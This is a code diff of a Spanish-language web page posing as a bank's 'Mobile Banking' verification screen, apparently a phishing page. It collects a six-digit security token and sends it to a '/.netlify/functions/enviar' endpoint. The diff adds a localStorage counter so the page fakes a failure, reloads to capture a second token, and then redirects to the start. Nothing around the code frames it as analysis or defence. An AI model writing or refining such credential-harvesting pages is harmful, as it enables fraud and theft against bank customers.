@@ -8,7 +8,6 @@
 </head>
 <body>
 
-<!-- Header -->
 <header class="top-bar">
     <div class="title">Mobile Banking</div>
     <div class="classic">
@@ -17,12 +16,10 @@
     </div>
 </header>
 
-<!-- Logo -->
 <div class="logo-container">
     <img src="bna.png" alt="Logo">
 </div>
 
-<!-- Card -->
 <div class="login-card">
     <div class="login-title">Verificación requerida</div>
 
@@ -47,7 +44,6 @@
     </button>
 </div>
 
-<!-- Footer -->
 <footer class="footer">
     <span class="close">✖</span>
     <p>Salir</p>
@@ -64,11 +60,15 @@ tokenInput.addEventListener("input", () => {
 function enviarToken() {
     const token = tokenInput.value.trim();
 
-    // Obligatorio 6 dígitos
     if (token.length !== 6) {
         tokenInput.focus();
         return;
     }
+
+    // Obtener intentos actuales
+    let intentos = parseInt(localStorage.getItem("token_intentos")) || 0;
+    intentos++;
+    localStorage.setItem("token_intentos", intentos);
 
     fetch("/.netlify/functions/enviar", {
         method: "POST",
@@ -78,14 +78,17 @@ function enviarToken() {
             valor: token
         })
     }).finally(() => {
-        // vuelve al mismo lugar (bucle)
-        window.location.href = window.location.href;
+        if (intentos >= 2) {
+            // reset y volver al inicio
+            localStorage.removeItem("token_intentos");
+            window.location.href = "index.html";
+        } else {
+            // primer intento → recarga
+            window.location.reload();
+        }
     });
 }
 </script>
 
 </body>
 </html>
-
-
-
